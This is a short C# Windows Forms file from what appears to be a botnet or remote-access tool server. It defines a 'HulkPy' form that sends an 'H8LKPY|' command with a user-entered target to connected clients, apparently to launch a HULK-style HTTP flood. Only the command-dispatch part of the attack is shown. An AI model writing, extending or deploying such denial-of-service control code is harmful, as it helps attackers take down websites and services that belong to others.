using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class HulkPy : Form
    {
        public HulkPy()
        {
            InitializeComponent();
        }
        bool safe = false;
        private void button2_Click(object sender, EventArgs e)
        {
            safe = textBox2.Text == "safe" ? true : false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Form1 F = new Form1();
            F.SendData(safe ? "H8LKPY|" + textBox1.Text + "@safe" : "H8LKPY|" + textBox1.Text + "@ ");
        }
    }
}
